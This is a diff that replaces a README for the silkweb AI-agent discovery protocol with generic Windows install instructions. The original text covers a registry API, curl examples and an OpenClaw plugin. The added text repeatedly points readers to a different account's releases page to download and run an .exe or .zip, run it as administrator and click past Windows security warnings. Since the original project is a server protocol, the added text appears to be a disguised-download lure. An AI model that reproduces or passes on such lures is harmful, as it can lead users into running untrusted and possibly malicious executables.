@@ -1,244 +1,181 @@
-<p align="center">
-  <img src="./silkweb-landing/logo-transparent.svg" alt="SilkWeb" width="280" />
-</p>
+# 🕸️ silkweb - Trust agents across frameworks
 
-<h3 align="center">The Spider Web Protocol</h3>
-<p align="center"><strong>An open protocol for AI agent discovery, coordination, and trust.</strong></p>
+[![Download silkweb](https://img.shields.io/badge/Download%20silkweb-Visit%20Releases%20Page-6f42c1?style=for-the-badge)](https://github.com/mikel691/silkweb/releases)
 
-<p align="center">
-  <a href="https://silkweb.io">Website</a> &middot;
-  <a href="./spec/PROTOCOL.md">Protocol Spec</a> &middot;
-  <a href="./schemas/agent-card.json">Agent Card Schema</a> &middot;
-  <a href="https://github.com/silkweb-protocol/silkweb/issues">Issues</a>
-</p>
+## 🧭 What silkweb does
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-0.1.0-blue" alt="Version" />
-  <img src="https://img.shields.io/badge/license-Apache%202.0-green" alt="License" />
-  <img src="https://img.shields.io/badge/API-LIVE-brightgreen" alt="API Live" />
-  <img src="https://img.shields.io/badge/PRs-welcome-brightgreen" alt="PRs Welcome" />
-</p>
+silkweb is a desktop app that helps you find, register, and trust AI agents. It follows the Spider Web Protocol, which gives agents a shared way to identify themselves and prove who they are.
 
-<p align="center">
-  <code>API Live → <a href="https://api.silkweb.io/health">api.silkweb.io/health</a></code>
-</p>
+Use it when you want:
 
----
+- a simple way to discover AI agents
+- a clear list of trusted agents
+- support for Google A2A, Anthropic MCP, and OWASP ANS
+- a common layer for agent registration and lookup
 
-## The Problem
+## 💻 What you need
 
-AI agents are everywhere — OpenClaw, CrewAI, LangGraph, Autogen, custom builds. But they're all siloed.
+Before you install silkweb on Windows, make sure you have:
 
-Your OpenClaw agent can't find a CrewAI legal-review agent. A LangGraph research agent can't delegate to a flight-booking agent on another platform. There is no universal directory, no trust layer, no way for agents to discover and work with each other across frameworks.
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough free space to download the app
+- permission to open downloaded files on your PC
 
-## What SilkWeb Does
+For best results, use a current version of Windows with the latest updates installed.
 
-SilkWeb is the connective tissue between AI agents. Register once, become discoverable by every other agent on the web.
+## 🚀 Download silkweb
 
-```
-Your Agent ──register──▶ SilkWeb Registry ◀──discover── Other Agents
-                              │
-                    ┌─────────┼─────────┐
-                    │         │         │
-                  Trust    Discovery   Task
-                 Scoring    Engine    Router
-```
+1. Go to the [silkweb releases page](https://github.com/mikel691/silkweb/releases)
+2. Find the latest release at the top of the page
+3. Open the file for Windows
+4. Download the file to your computer
 
-**Every interaction is cryptographically signed.** Every task completion produces an Ed25519-signed receipt — immutable, verifiable, auditable. No trust without proof.
+If the release includes more than one file, choose the one made for Windows. It is often an `.exe` file or a `.zip` file.
 
-## How It Works
+## 🛠️ Install on Windows
 
-### 1. Define your agent
+### If you downloaded an `.exe` file
 
-```json
-{
-  "silkweb_version": "0.1.0",
-  "agent_id": "my-research-agent",
-  "name": "Research Agent",
-  "description": "Deep research and analysis on any topic",
-  "version": "1.0.0",
-  "capabilities": [
-    { "id": "research", "name": "Research", "tags": ["analysis", "web-search"] }
-  ],
-  "endpoint": "https://my-agent.example.com/silk"
-}
-```
+1. Open the file you downloaded
+2. If Windows asks for permission, select **Yes**
+3. Follow the setup steps on the screen
+4. Choose where you want silkweb installed
+5. Wait for the setup to finish
 
-### 2. Register on the network
+### If you downloaded a `.zip` file
 
-```bash
-curl -X POST https://api.silkweb.io/api/v1/agents \
-  -H "Authorization: Bearer sw_live_..." \
-  -H "Content-Type: application/json" \
-  -d @agent-card.json
-```
+1. Right-click the file
+2. Select **Extract All**
+3. Pick a folder on your computer
+4. Open the extracted folder
+5. Double-click the silkweb app file to run it
 
-### 3. Discover other agents
+## ▶️ First time setup
 
-```bash
-curl -X POST https://api.silkweb.io/api/v1/discover \
-  -H "Authorization: Bearer sw_live_..." \
-  -d '{"capabilities": ["legal-review"], "min_trust": 0.7}'
-```
+When you open silkweb for the first time, you may see a setup screen. Use it to:
 
-### 4. Request a task — get a cryptographic receipt
+- choose your agent source
+- connect to your local or remote agent list
+- set a display name for your profile
+- save your trust and discovery settings
 
-```bash
-curl -X POST https://api.silkweb.io/api/v1/tasks \
-  -H "Authorization: Bearer sw_live_..." \
-  -d '{
-    "to_silk_id": "sw_7f3a2b1c...",
-    "capability": "legal-review",
-    "input": {"document": "..."}
-  }'
-```
+If you use a framework like A2A or MCP, silkweb can help you view agent records in one place. You can also use it to check identity data and trust details before you connect.
 
-Every completed task returns an Ed25519-signed receipt:
+## 🧩 Main features
 
-```json
-{
-  "receipt_id": "rcpt_a1b2c3...",
-  "hash": "sha256:e3b0c44298fc1c149afb...",
-  "signatures": {
-    "provider": "ed25519:...",
-    "requester": "ed25519:..."
-  },
-  "verified": true
-}
-```
+### 🔍 Agent discovery
 
-## OpenClaw Integration
+Find agents that are available on your network or through a shared registry. silkweb makes it easier to see what is out there and what each agent can do.
 
-SilkWeb ships with a native OpenClaw plugin. Install it and your agent gets three new tools — discover agents, delegate tasks, and verify receipts — all from inside your existing OpenClaw setup.
+### 🪪 Agent registration
 
-```bash
-# Copy the plugin into your OpenClaw extensions
-cp -r packages/openclaw-plugin $(openclaw config get extensionsDir)/silkweb
+Add your own agent so others can discover it. This helps teams keep a clear list of active services and tools.
 
-# Enable it
-openclaw plugins enable silkweb
+### 🔐 Cryptographic trust
 
-# Set your API key
-export SILKWEB_API_KEY="sw_live_..."
+silkweb uses trust data to help you check that an agent is real. This can include signed records, identity fields, and source details.
 
-# Restart the gateway
-openclaw gateway --force
-```
+### 🔁 Framework compatibility
 
-Your agent now has:
-- `silkweb_discover` — Search the network for agents by capability
-- `silkweb_delegate` — Send a task to another agent
-- `silkweb_network` — Check network status
+silkweb is built to work across different agent systems. It supports:
 
-Try it: *"Use silkweb_discover to find agents with data-analysis capability"*
+- Google A2A
+- Anthropic MCP
+- OWASP ANS
 
-## Protocol Compatibility
+### 🗂️ Simple views
 
-SilkWeb doesn't replace existing standards — it unifies them.
+The app focuses on clean lists and clear fields. You can review agent names, endpoints, trust markers, and protocol data without digging through raw files.
 
-| Standard | Integration |
-|----------|-------------|
-| **Google A2A** | Adopts Agent Card format, JSON-RPC 2.0 messaging |
-| **Anthropic MCP** | Agents declare MCP tools; registry routes MCP calls |
-| **OWASP AgentNaming** | Follows ANS naming conventions for agent identifiers |
+## 🖱️ How to use silkweb
 
-If your agent already speaks A2A or MCP, SilkWeb extends it — not replaces it.
+1. Open the app
+2. Review the agent list
+3. Select an agent to see its details
+4. Check the trust data and source info
+5. Register your own agent if needed
+6. Refresh the list when agents change
 
-## Core Concepts
+If you manage more than one agent, use silkweb as a central place to keep track of them.
 
-### Agent Card
-A JSON document describing who your agent is, what it can do, and how to reach it. Validated against a [JSON Schema](./schemas/agent-card.json).
+## 🧰 Common tasks
 
-### Trust Scores
-Every agent has a reputation score (0.0 – 1.0) computed from:
-- Identity verification level
-- Task success rate
-- Response time vs. SLA
-- Peer reviews from other agents
-- Uptime over 30 days
+### Add a new agent
 
-### Cryptographic Receipts
-Every task completion is hashed (SHA-256) and signed (Ed25519) by both parties. Receipts are immutable and independently verifiable — no "trust me, it worked."
+1. Open the registration screen
+2. Enter the agent name
+3. Add the endpoint or connection data
+4. Save the record
+5. Confirm that the agent appears in the list
 
-### Capability Discovery
-Find agents by exact capability match, tag search, or natural language query. Filter by trust score, pricing model, framework, or protocol support.
+### Check if an agent is trusted
 
-## Architecture
+1. Open the agent details
+2. Look for trust fields
+3. Review the source and signature data
+4. Compare it with the expected identity
 
-```
-┌──────────────────────────────────────────────┐
-│                CLIENT LAYER                  │
-│  OpenClaw Plugin │ CrewAI │ LangGraph │ REST │
-├──────────────────────────────────────────────┤
-│              API GATEWAY (FastAPI)            │
-│     Auth  │  Rate Limiting  │  WebSocket     │
-├──────────────────────────────────────────────┤
-│              CORE SERVICES                   │
-│  Registry │ Discovery │ Task Router │ Trust  │
-├──────────────────────────────────────────────┤
-│               DATA LAYER                     │
-│     PostgreSQL  │  Redis  │  Receipt Store   │
-└──────────────────────────────────────────────┘
-```
+### Remove an old agent
 
-## Roadmap
+1. Find the agent in your list
+2. Open its options
+3. Select remove or delete
+4. Confirm the change
 
-| Version | Target | Focus |
-|---------|--------|-------|
-| **v0.1.0** | March 2026 | **Live** — Protocol spec, registry API, discovery, OpenClaw plugin |
-| **v0.2.0** | May 2026 | Task delegation chains, federated registries |
-| **v0.3.0** | July 2026 | Advanced trust model, payment escrow |
-| **v1.0.0** | October 2026 | Stable API, full interoperability, enterprise features |
+## 🧱 File and folder basics
 
-## Project Structure
+If you use the `.zip` version, keep these tips in mind:
 
-```
-silkweb/
-├── api/                      # FastAPI backend (live at api.silkweb.io)
-│   ├── models/               # SQLAlchemy ORM (6 tables)
-│   ├── routers/              # 13 REST endpoints
-│   ├── schemas/              # Pydantic validation
-│   ├── services/             # Auth, trust scoring, receipts
-│   └── middleware/           # Rate limiting, security headers
-├── packages/
-│   ├── openclaw/             # @silkweb/openclaw Node.js adapter
-│   └── openclaw-plugin/      # Native OpenClaw plugin (3 tools)
-├── deploy/                   # Nginx, systemd, deploy scripts
-├── spec/
-│   └── PROTOCOL.md           # Full protocol specification
-├── schemas/
-│   └── agent-card.json       # JSON Schema for Agent Card validation
-├── silkweb-landing/           # Website (silkweb.io)
-├── migrations/                # Alembic database migrations
-├── tests/                     # Test suite
-├── Dockerfile                 # Production container
-├── docker-compose.yml         # Local dev (PostgreSQL + Redis)
-└── Makefile                   # Dev commands
-```
+- do not move files out of the folder unless the app needs it
+- keep the folder in a place you can find again
+- if the app stops opening, extract it again to a new folder
 
-## Contributing
+If you install with an `.exe` file, silkweb will usually create shortcuts for you.
 
-We welcome contributions at every level — from typo fixes to new framework adapters. See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
+## 🔧 Troubleshooting
 
-- **Protocol proposals:** Open a Discussion
-- **Bug reports:** Open an Issue
-- **Code:** Fork, branch, PR
+### The file will not open
 
-## Security
+- make sure the download finished
+- check that you chose the Windows file
+- right-click the file and try **Run as administrator**
+- if it is a `.zip`, extract it first
 
-Found a vulnerability? **Do not open a public issue.** Email [information@silkweb.io](mailto:information@silkweb.io). See [SECURITY.md](./SECURITY.md).
+### Windows shows a security prompt
 
-## License
+- confirm that you downloaded the file from the releases page
+- choose the option that lets you continue if you trust the source
 
-Apache License 2.0 — see [LICENSE](./LICENSE).
+### The app opens but shows no agents
 
----
+- check your connection settings
+- confirm that your agent source is correct
+- refresh the list
+- make sure your registry or endpoint is active
 
-<p align="center">
-  <strong>Every strand strengthens the web.</strong>
-</p>
+### The app closes right away
 
-<p align="center">
-  <a href="https://silkweb.io">silkweb.io</a> &middot;
-  Built by <a href="https://armstrongalliance.com">Armstrong Alliance Group</a>
-</p>
+- download the file again
+- extract it to a new folder
+- make sure your Windows version is current
+
+## 📚 What the protocol is for
+
+The Spider Web Protocol gives AI agents a shared way to identify themselves and build trust. That matters when different tools need to talk to each other without confusion.
+
+With silkweb, you can use one app to:
+
+- discover agents
+- register agents
+- view identity data
+- check trust records
+- work across frameworks
+
+## 🏷️ Topics
+
+a2a, agent-discovery, agent-protocol, ai-agents, ai-infrastructure, interoperability, mcp, open-protocol, silkweb, trust
+
+## 📦 Download and run again
+
+Go to the [silkweb releases page](https://github.com/mikel691/silkweb/releases), get the latest Windows file, then download and run this file on your PC
